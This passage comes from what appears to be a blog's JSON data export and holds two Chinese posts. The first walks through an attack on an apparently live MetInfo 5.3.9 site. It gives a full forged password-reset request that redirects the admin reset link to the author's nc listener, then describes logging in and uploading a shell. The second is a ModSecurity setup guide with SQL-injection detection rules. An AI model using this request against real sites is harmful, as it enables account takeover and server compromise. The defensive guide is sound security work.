close\nUpgrade-Insecure-Requests: 1\n\naction=next2&abt_type=2&admin_mobile=admin&submit=%E4%B8%8B%E4%B8%80%E6%AD%A5&met_fd_port=12345&met_host=***.***.***.***:8080\n\n```\n\n\n\n在服务器上用nc监听8080端口后Burp发包。\n\n![3](/img/cms/MetInfo/Getshell/3.png)\n\n发包后服务器能够接收到重置密码的链接。\n\n![004](/img/cms/MetInfo/Getshell/4.png)\n\n使用链接重置密码，登录后台。\n\n![005](/img/cms/MetInfo/Getshell/5.png)\n\n登录后台。\n\n![006](/img/cms/MetInfo/Getshell/6.png)\n\n上传网站图标\n\n![007](/img/cms/MetInfo/Getshell/7.png)\n\n构造exp生成shell。\n\n![008](/img/cms/MetInfo/Getshell/8.png)\n\n","source":"_posts/MetInfos实战.md","raw":"---\ntitle: MetInfos实战\ndate: 2019-04-10 23:11:52\ntags: [CMS]\ncategories: [CMS,渗透]\n---\n\n发现目标是**MetInfo 5.3.9** ，结合任意账户密码重置登录后台Getshell。\n\n![001](/img/cms/MetInfo/Getshell/1.png)\n\n在忘记密码处抓包，添加met_fd_port和met_host,met_host是服务器ip地址。先别忙发送。\n\n![002](/img/cms/MetInfo/Getshell/2.png)\n\n数据包如下。\n\n```\nPOST /admin/admin/getpassword.php HTTP/1.1\nHost: ***.***.***.***\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:60.0) Gecko/20100101 Firefox/60.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nReferer: http://***.***.***.***/admin/admin/getpassword.php\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 123\nConnection: close\nUpgrade-Insecure-Requests: 1\n\naction=next2&abt_type=2&admin_mobile=admin&submit=%E4%B8%8B%E4%B8%80%E6%AD%A5&met_fd_port=12345&met_host=***.***.***.***:8080\n\n```\n\n\n\n在服务器上用nc监听8080端口后Burp发包。\n\n![3](/img/cms/MetInfo/Getshell/3.png)\n\n发包后服务器能够接收到重置密码的链接。\n\n![004](/img/cms/MetInfo/Getshell/4.png)\n\n使用链接重置密码，登录后台。\n\n![005](/img/cms/MetInfo/Getshell/5.png)\n\n登录后台。\n\n![006](/img/cms/MetInfo/Getshell/6.png)\n\n上传网站图标\n\n![007](/img/cms/MetInfo/Getshell/7.png)\n\n构造exp生成shell。\n\n![008](/img/cms/MetInfo/Getshell/8.png)\n\n","slug":"MetInfos实战","published":1,"updated":"2019-06-19T17:23:13.381Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istbp000g4dsbfrleidas","content":"<p>发现目标是<strong>MetInfo 5.3.9</strong> ，结合任意账户密码重置登录后台Getshell。</p>\n<p><img src=\"/img/cms/MetInfo/Getshell/1.png\" alt=\"001\"></p>\n<p>在忘记密码处抓包，添加met_fd_port和met_host,met_host是服务器ip地址。先别忙发送。</p>\n<p><img src=\"/img/cms/MetInfo/Getshell/2.png\" alt=\"002\"></p>\n<p>数据包如下。</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">POST</span> <span class=\"string\">/admin/admin/getpassword.php</span> HTTP/1.1</span><br><span class=\"line\"><span class=\"attribute\">Host</span>: ***.***.***.***</span><br><span class=\"line\"><span class=\"attribute\">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:60.0) Gecko/20100101 Firefox/60.0</span><br><span class=\"line\"><span class=\"attribute\">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class=\"line\"><span class=\"attribute\">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class=\"line\"><span class=\"attribute\">Accept-Encoding</span>: gzip, deflate</span><br><span class=\"line\"><span class=\"attribute\">Referer</span>: http://***.***.***.***/admin/admin/getpassword.php</span><br><span class=\"line\"><span class=\"attribute\">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class=\"line\"><span class=\"attribute\">Content-Length</span>: 123</span><br><span class=\"line\"><span class=\"attribute\">Connection</span>: close</span><br><span class=\"line\"><span class=\"attribute\">Upgrade-Insecure-Requests</span>: 1</span><br><span class=\"line\"></span><br><span class=\"line\">action=next2&amp;abt_type=2&amp;admin_mobile=admin&amp;submit=%E4%B8%8B%E4%B8%80%E6%AD%A5&amp;met_fd_port=12345&amp;met_host=***.***.***.***:8080</span><br></pre></td></tr></table></figure>\n\n<p>在服务器上用nc监听8080端口后Burp发包。</p>\n<p><img src=\"/img/cms/MetInfo/Getshell/3.png\" alt=\"3\"></p>\n<p>发包后服务器能够接收到重置密码的链接。</p>\n<p><img src=\"/img/cms/MetInfo/Getshell/4.png\" alt=\"004\"></p>\n<p>使用链接重置密码，登录后台。</p>\n<p><img src=\"/img/cms/MetInfo/Getshell/5.png\" alt=\"005\"></p>\n<p>登录后台。</p>\n<p><img src=\"/img/cms/MetInfo/Getshell/6.png\" alt=\"006\"></p>\n<p>上传网站图标</p>\n<p><img src=\"/img/cms/MetInfo/Getshell/7.png\" alt=\"007\"></p>\n<p>构造exp生成shell。</p>\n<p><img src=\"/img/cms/MetInfo/Getshell/8.png\" alt=\"008\"></p>\n","site":{"data":{}},"excerpt":"","more":"<p>发现目标是<strong>MetInfo 5.3.9</strong> ，结合任意账户密码重置登录后台Getshell。</p>\n<p><img src=\"/img/cms/MetInfo/Getshell/1.png\" alt=\"001\"></p>\n<p>在忘记密码处抓包，添加met_fd_port和met_host,met_host是服务器ip地址。先别忙发送。</p>\n<p><img src=\"/img/cms/MetInfo/Getshell/2.png\" alt=\"002\"></p>\n<p>数据包如下。</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">POST</span> <span class=\"string\">/admin/admin/getpassword.php</span> HTTP/1.1</span><br><span class=\"line\"><span class=\"attribute\">Host</span>: ***.***.***.***</span><br><span class=\"line\"><span class=\"attribute\">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:60.0) Gecko/20100101 Firefox/60.0</span><br><span class=\"line\"><span class=\"attribute\">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class=\"line\"><span class=\"attribute\">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class=\"line\"><span class=\"attribute\">Accept-Encoding</span>: gzip, deflate</span><br><span class=\"line\"><span class=\"attribute\">Referer</span>: http://***.***.***.***/admin/admin/getpassword.php</span><br><span class=\"line\"><span class=\"attribute\">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class=\"line\"><span class=\"attribute\">Content-Length</span>: 123</span><br><span class=\"line\"><span class=\"attribute\">Connection</span>: close</span><br><span class=\"line\"><span class=\"attribute\">Upgrade-Insecure-Requests</span>: 1</span><br><span class=\"line\"></span><br><span class=\"line\">action=next2&amp;abt_type=2&amp;admin_mobile=admin&amp;submit=%E4%B8%8B%E4%B8%80%E6%AD%A5&amp;met_fd_port=12345&amp;met_host=***.***.***.***:8080</span><br></pre></td></tr></table></figure>\n\n<p>在服务器上用nc监听8080端口后Burp发包。</p>\n<p><img src=\"/img/cms/MetInfo/Getshell/3.png\" alt=\"3\"></p>\n<p>发包后服务器能够接收到重置密码的链接。</p>\n<p><img src=\"/img/cms/MetInfo/Getshell/4.png\" alt=\"004\"></p>\n<p>使用链接重置密码，登录后台。</p>\n<p><img src=\"/img/cms/MetInfo/Getshell/5.png\" alt=\"005\"></p>\n<p>登录后台。</p>\n<p><img src=\"/img/cms/MetInfo/Getshell/6.png\" alt=\"006\"></p>\n<p>上传网站图标</p>\n<p><img src=\"/img/cms/MetInfo/Getshell/7.png\" alt=\"007\"></p>\n<p>构造exp生成shell。</p>\n<p><img src=\"/img/cms/MetInfo/Getshell/8.png\" alt=\"008\"></p>\n"},{"title":"ModSecurity","date":"2018-12-28T07:24:32.000Z","_content":"\n# ModSecurity\n\n---\n\n## 配置环境(ubuntu18.04)\n\n```shell\n#备份源\nsudo cp /etc/apt/sources.list /etc/apt/sources.list.bak\n#添加阿里云源\nsudo vim /etc/apt/sources.list\n\n#把以下内容覆盖\ndeb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse\n\ndeb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse\n\ndeb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse\n\ndeb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse\n\ndeb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse\n\ndeb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse\n\ndeb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse\n\ndeb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse\n\ndeb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse\n\ndeb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse\n\n#保存退出后更新软件列表\nsudo apt-get update\n#更新软件包\nsudo apt-get upgrade\n```\n\n## 安装apache\n\n```shell\nsudo apt install apache2\n```\n\n![001](/img/modsecurity/001.png)\n\n## 安装MYSQL\n\n```shell\nsudo apt install mysql-server\n```\n\n### 设置root密码\n\n```shell\nsudo su\nmysql\nmysql> select user, plugin from mysql.user;\n+------------------+-----------------------+\n| user             | plugin                |\n+------------------+-----------------------+\n| root             | auth_socket           |\n| mysql.session    | mysql_native_password |\n| mysql.sys        | mysql_native_password |\n| debian-sys-maint | mysql_native_password |\n+------------------+-----------------------+\n\nmysql> update mysql.user set authentication_string=PASSWORD('密码'), plugin='mysql_native_password' where user='root';\nmysql> flush privileges;\nmysql> exit\n\n#重启mysql\nsudo /etc/init.d/mysql restart\nmysql -uroot -p\n```\n\n## 安装PHP\n\n```shell\nsudo apt install php libapache2-mod-php php-mysql\n#添加info.php文件来测试\n<?php\nphpinfo();\n?>\n```\n\n![002](/img/modsecurity/002.png)\n\n\n\n```shell\n#默认版本不符合实验，安装PHP5.6\nsudo add-apt-repository -y ppa:ondrej/php\nsudo apt update\nsudo apt install php5.6\n\n#首先使用命令禁用 PHP 7.2 模块\nsudo a2dismod php7.2\n#启用 PHP 5.6 模块\nsudo a2enmod php5.6\n\nsudo apt install libapache2-mod-php5.6 php-mysql5.6\n#重启apache2\nsudo systemctl restart apache2\n```\n\n其他配置\n\n```shell\n#将 PHP 5.6 设置为默认版本\nsudo update-alternatives --set php /usr/bin/php5.6\n#设置默认情况下要使用的全局 PHP 版本\nsudo update-alternatives --config php\n```\n\n\n\n## 配置phpmyadmin\n\n```shell\n#安装phpmyadmin,安装中会要求输入数据库连接密码\nsudo apt install phpmyadmin\n\n#创建软链接到web根目录下（我的是/var/www/html/)\nsudo ln -s /usr/share/phpmyadmin /var/www/html/phpmyadmin\n\nsudo apt-get install php5.6-mbstring\nsudo apt-get install php5.6-gettext\n```\n\n如果出现`The mbstring extension is missing. Please check your PHP configuration.`的错误\n\n```shell\n#确保php_mbstring安装，且配置文件打开(下面是我的目录)\n/etc/php/5.6/apache2/php.ini\n```\n\n![003](/img/modsecurity/003.png)\n\n## modsecurity\n\n```shell\n#添加源\nsudo vim /etc/apt/sources.list\n\ndeb http://mirrors.aliyun.com/ubuntu/ xenial main restricted universe multiverse\n\ndeb http://mirrors.aliyun.com/ubuntu/ xenial-security main restricted universe multiverse\n\ndeb http://mirrors.aliyun.com/ubuntu/ xenial-updates main restricted universe multiverse\n\ndeb http://mirrors.aliyun.com/ubuntu/ xenial-backports main restricted universe multiverse\n\nsudo apt-get update\n```\n\n### 安装modsecurity\n\n```shell\nsudo apt-get install libxml2 libxml2-dev libxml2-utils libaprutil1 libaprutil1-dev libapache2-modsecurity\n```\n\n### 开启ModSecurity功能\n\n```shell\ncd /etc/modsecurity/\nsudo mv modsecurity.conf-recommended modsecurity.conf\nsudo vim /etc/modsecurity/modsecurity.conf\n\n查找SecRuleEngine，并将其修改为On：\nSecRuleEngine On\n```\n### 安装OWASP Rule Set\n\n```shell\ncd ~\nsudo wget https://github.com/root25/MODSEC/raw/master/modsecurity-crs_2.2.5.tar.gz\nsudo tar -zxvf modsecurity-crs_2.2.5.tar.gz\nsudo mkdir -p /usr/share/modsecurity-crs\nsudo cp -R modsecurity-crs_2.2.5/* /usr/share/modsecurity-crs/\n```\n\n在`/usr/share/modsecurity-crs/`的目录下，有主要的几个规则目录，activated_rules、slr_rules、optional_rules和base_rules.\n\n将srl_rules、base_rules和optional_rules目录下的所有conf文件，拷贝到activated_rules目录下。\n\n```shell\nsudo cp /usr/share/modsecurity-crs/modsecurity-crs_10_setup.conf.example /usr/share/modsecurity-crs/modsecurity-crs_10_setup.conf\n\ncd /usr/share/modsecurity-crs/activated_rules\n\nsudo cp /usr/share/modsecurity-crs/base_rules/* .\n\nsudo cp /usr/share/modsecurity-crs/optional_rules/* .\n\nsudo cp /usr/share/modsecurity-crs/slr_rules/* .\n```\n\n### 在apache中启用modsecurity模块\n\n```shell\nsudo vim /etc/apache2/mods-available/security2.conf\n#在 … 中加入以下内容，保存退出。\nincludeOptional /etc/modsecurity/*.conf\ninclude /usr/share/modsecurity-crs/*.conf\ninclude /usr/share/modsecurity-crs/activated_rules/*.conf\n\n#因为要用自己的规则，修改如下\n<IfModule security2_module>\n        # Default Debian dir for modsecurity's persistent data\n        SecDataDir /var/cache/modsecurity\n\n        # Include all the *.conf files in /etc/modsecurity.\n        # Keeping your local configuration in that directory\n        # will allow for an easy upgrade of THIS file and\n        # make your life easier\n        IncludeOptional /etc/modsecurity/*.conf\n\n        # Include OWASP ModSecurity CRS rules if installed\n        #IncludeOptional /usr/share/modsecurity-crs/owasp-crs.load\n        include /usr/share/modsecurity-crs/activated_rules/my.conf\n</IfModule>\n```\n\n### 启用headers和Modsecurity\n\n```shell\nsudo a2enmod headers\nsudo a2enmod security2\n```\n在中`/usr/share/modsecurity-crs/activated_rules/my.conf`编写规则测试即可\n\n```shell\nSecRule ARGS \"@contains select\" \"id:00001,msg:'SQL Injection maybe',phase:1,t:compressWhitespace,t:htmlEntityDecode,deny\"\n\nSecRule ARGS \"@contains union\" \"id:00002,msg:'SQL Injection maybe',phase:1,t:compressWhitespace,t:htmlEntityDecode,block\" \n```\n\n","source":"_posts/ModSecurity.md","raw":"---\ntitle: ModSecurity\ndate: 2018-12-28 15:24:32\ntags: [环境搭建]\ncategories: \n---\n\n# ModSecurity\n\n---\n\n## 配置环境(ubuntu18.04)\n\n```shell\n#备份源\nsudo cp /etc/apt/sources.list /etc/apt/sources.list.bak\n#添加阿里云源\nsudo vim /etc/apt/sources.list\n\n#把以下内容覆盖\ndeb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse\n\ndeb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse\n\ndeb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse\n\ndeb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse\n\ndeb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse\n\ndeb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse\n\ndeb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse\n\ndeb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse\n\ndeb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse\n\ndeb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse\n\n#保存退出后更新软件列表\nsudo apt-get update\n#更新软件包\nsudo apt-get upgrade\n```\n\n## 安装apache\n\n```shell\nsudo apt install apache2\n```\n\n![001](/img/modsecurity/001.png)\n\n## 安装MYSQL\n\n```shell\nsudo apt install mysql-server\n```\n\n### 设置root密码\n\n```shell\nsudo su\nmysql\nmysql> select user, plugin from mysql.user;\n+------------------+-----------------------+\n| user             | plugin                |\n+------------------+-----------------------+\n| root             | auth_socket           |\n| mysql.session    | mysql_native_password |\n| mysql.sys        | mysql_native_password |\n| debian-sys-maint | mysql_native_password |\n+------------------+-----------------------+\n\nmysql> update mysql.user set authentication_string=PASSWORD('密码'), plugin='mysql_native_password' where user='root';\nmysql> flush privileges;\nmysql> exit\n\n#重启mysql\nsudo /etc/init.d/mysql restart\nmysql -uroot -p\n```\n\n## 安装PHP\n\n```shell\nsudo apt install php libapache2-mod-php php-mysql\n#添加info.php文件来测试\n<?php\nphpinfo();\n?>\n```\n\n![002](/img/modsecurity/002.png)\n\n\n\n```shell\n#默认版本不符合实验，安装PHP5.6\nsudo add-apt-repository -y ppa:ondrej/php\nsudo apt update\nsudo apt install php5.6\n\n#首先使用命令禁用 PHP 7.2 模块\nsudo a2dismod php7.2\n#启用 PHP 5.6 模块\nsudo a2enmod php5.6\n\nsudo apt install libapache2-mod-php5.6 php-mysql5.6\n#重启apache2\nsudo systemctl restart apache2\n```\n\n其他配置\n\n```shell\n#将 PHP 5.6 设置为默认版本\nsudo update-alternatives --set php /usr/bin/php5.6\n#设置默认情况下要使用的全局 PHP 版本\nsudo update-alternatives --config php\n```\n\n\n\n## 配置phpmyadmin\n\n```shell\n#安装phpmyadmin,安装中会要求输入数据库连接密码\nsudo apt install phpmyadmin\n\n#创建软链接到web根目录下（我的是/var/www/html/)\nsudo ln -s /usr/share/phpmyadmin /var/www/html/phpmyadmin\n\nsudo apt-get install php5.6-mbstring\nsudo apt-get install php5.6-gettext\n```\n\n如果出现`The mbstring extension is missing. Please check your PHP configuration.`的错误\n\n```shell\n#确保php_mbstring安装，且配置文件打开(下面是我的目录)\n/etc/php/5.6/apache2/php.ini\n```\n\n![003](/img/modsecurity/003.png)\n\n## modsecurity\n\n```shell\n#添加源\nsudo vim /etc/apt/sources.list\n\ndeb http://mirrors.aliyun.com/ubuntu/ xenial main restricted universe multiverse\n\ndeb http://mirrors.aliyun.com/ubuntu/ xenial-security main restricted universe multiverse\n\ndeb http://mirrors.aliyun.com/ubuntu/ xenial-updates main restricted universe multiverse\n\ndeb http://mirrors.aliyun.com/ubuntu/ xenial-backports main restricted universe multiverse\n\nsudo apt-get update\n```\n\n### 安装modsecurity\n\n```shell\nsudo apt-get install libxml2 libxml2-dev libxml2-utils libaprutil1 libaprutil1-dev libapache2-modsecurity\n```\n\n### 开启ModSecurity功能\n\n```shell\ncd /etc/modsecurity/\nsudo mv modsecurity.conf-recommended modsecurity.conf\nsudo vim /etc/modsecurity/modsecurity.conf\n\n查找SecRuleEngine，并将其修改为On：\nSecRuleEngine On\n```\n### 安装OWASP Rule Set\n\n```shell\ncd ~\nsudo wget https://github.com/root25/MODSEC/raw/master/modsecurity-crs_2.2.5.tar.gz\nsudo tar -zxvf modsecurity-crs_2.2.5.tar.gz\nsudo mkdir -p /usr/share/modsecurity-crs\nsudo cp -R modsecurity-crs_2.2.5/* /usr/share/modsecurity-crs/\n```\n\n在`/usr/share/modsecurity-crs/`的目录下，有主要的几个规则目录，activated_rules、slr_rules、optional_rules和base_rules.\n\n将srl_rules、base_rules和optional_rules目录下的所有conf文件，拷贝到activated_rules目录下。\n\n```shell\nsudo cp /usr/share/modsecurity-crs/modsecurity-crs_10_setup.conf.example /usr/share/modsecurity-crs/modsecurity-crs_10_setup.conf\n\ncd /usr/share/modsecurity-crs/activated_rules\n\nsudo cp /usr/share/modsecurity-crs/base_rules/* .\n\nsudo cp /usr/share/modsecurity-crs/optional_rules/* .\n\nsudo cp /usr/share/modsecurity-crs/slr_rules/* .\n```\n\n### 在apache中启用modsecurity模块\n\n```shell\nsudo vim /etc/apache2/mods-available/security2.conf\n#在 … 中加入以下内容，保存退出。\nincludeOptional /etc/modsecurity/*.conf\ninclude /usr/share/modsecurity-crs/*.conf\ninclude /usr/share/modsecurity-crs/activated_rules/*.conf\n\n#因为要用自己的规则，修改如下\n<IfModule security2_module>\n        # Default Debian dir for modsecurity's persistent data\n        SecDataDir /var/cache/modsecurity\n\n        # Include all the *.conf files in /etc/modsecurity.\n        # Keeping your local configuration in that directory\n        # will allow for an easy upgrade of THIS file and\n        # make your life easier\n        IncludeOptional /etc/modsecurity/*.conf\n\n        # Include OWASP ModSecurity CRS rules if installed\n        #IncludeOptional /usr/share/modsecurity-crs/owasp-crs.load\n        include /usr/share/modsecurity-crs/activated_rules/my.conf\n</IfModule>\n```\n\n### 启用headers和Modsecurity\n\n```shell\nsudo a2enmod headers\nsudo a2enmod security2\n```\n在中`/usr/share/modsecurity-crs/activated_rules/my.conf`编写规则测试即可\n\n```shell\nSecRule ARGS \"@contains select\" \"id:00001,msg:'SQL Injection maybe',phase:1,t:compressWhitespace,t:htmlEntityDecode,deny\"\n\nSecRule ARGS \"@contains union\" \"id:00002,msg:'SQL Injection maybe',phase:1,t:compressWhitespace,t:htmlEntityDecode,block\" \n```\n\n","slug":"ModSecurity","published":1,"updated":"2019-06-19T17:23:13.381Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istbq000k4dsbt4t16zh2","content":"<h1 id=\"ModSecurity\"><a href=\"#ModSecurity\" class=\"headerlink\" title=\"ModSecurity\"></a>ModSecurity</h1><hr>\n<h2 id=\"配置环境-ubuntu18-04\"><a href=\"#配置环境-ubuntu18-04\" class=\"headerlink\" title=\"配置环境(ubuntu18.04)\"></a>配置环境(ubuntu18.04)</h2><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">备份源</span></span><br><span class=\"line\">sudo cp /etc/apt/sources.list /etc/apt/sources.list.bak</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">添加阿里云源</span></span><br><span class=\"line\">sudo vim /etc/apt/sources.list</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">把以下内容覆盖</span></span><br><span class=\"line\">deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse</span><br><span class=\"line\"></span><br><span class=\"line\">deb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse</span><br><span class=\"line\"></span><br><span class=\"line\">deb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class=\"line\"></span><br><span class=\"line\">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class=\"line\"></span><br><span class=\"line\">deb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class=\"line\"></span><br><span class=\"line\">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class=\"line\"></span><br><span class=\"line\">deb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</span><br><span class=\"line\"></span><br><span class=\"line\">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</span><br><span class=\"line\"></span><br><span class=\"line\">deb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse</span><br><span class=\"line\"></span><br><span class=\"line\">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">保存退出后更新软件列表</span></span><br><span class=\"line\">sudo apt-get update</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">更新软件包</span></span><br><span class=\"line\">sudo apt-get upgrade</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"安装apache\"><a href=\"#安装apache\" class=\"headerlink\" title=\"安装apache\"></a>安装apache</h2><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt install apache2</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/modsecurity/001.png\" alt=\"001\"></p>\n<h2 id=\"安装MYSQL\"><a href=\"#安装MYSQL\" class=\"headerlink\" title=\"安装MYSQL\"></a>安装MYSQL</h2><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt install mysql-server</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"设置root密码\"><a href=\"#设置root密码\" class=\"headerlink\" title=\"设置root密码\"></a>设置root密码</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo su</span><br><span class=\"line\">mysql</span><br><span class=\"line\"><span class=\"meta\">mysql&gt;</span><span class=\"bash\"> select user, plugin from mysql.user;</span></span><br><span class=\"line\">+------------------+-----------------------+</span><br><span class=\"line\">| user             | plugin                |</span><br><span class=\"line\">+------------------+-----------------------+</span><br><span class=\"line\">| root             | auth_socket           |</span><br><span class=\"line\">| mysql.session    | mysql_native_password |</span><br><span class=\"line\">| mysql.sys        | mysql_native_password |</span><br><span class=\"line\">| debian-sys-maint | mysql_native_password |</span><br><span class=\"line\">+------------------+-----------------------+</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">mysql&gt;</span><span class=\"bash\"> update mysql.user <span class=\"built_in\">set</span> authentication_string=PASSWORD(<span class=\"string\">'密码'</span>), plugin=<span class=\"string\">'mysql_native_password'</span> <span class=\"built_in\">where</span> user=<span class=\"string\">'root'</span>;</span></span><br><span class=\"line\"><span class=\"meta\">mysql&gt;</span><span class=\"bash\"> flush privileges;</span></span><br><span class=\"line\"><span class=\"meta\">mysql&gt;</span><span class=\"bash\"> <span class=\"built_in\">exit</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">重启mysql</span></span><br><span class=\"line\">sudo /etc/init.d/mysql restart</span><br><span class=\"line\">mysql -uroot -p</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"安装PHP\"><a href=\"#安装PHP\" class=\"headerlink\" title=\"安装PHP\"></a>安装PHP</h2><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt install php libapache2-mod-php php-mysql</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">添加info.php文件来测试</span></span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">phpinfo();</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/modsecurity/002.png\" alt=\"002\"></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">默认版本不符合实验，安装PHP5.6</span></span><br><span class=\"line\">sudo add-apt-repository -y ppa:ondrej/php</span><br><span class=\"line\">sudo apt 